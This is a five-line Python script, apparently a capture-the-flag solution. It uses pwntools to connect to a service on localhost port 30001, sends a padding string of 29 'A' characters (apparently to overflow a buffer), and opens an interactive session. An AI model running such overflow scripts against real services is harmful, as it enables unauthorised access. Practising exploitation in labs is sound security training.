from pwn import *

r = remote('localhost', 30001)
r.sendline('A' * 29)
r.interactive()
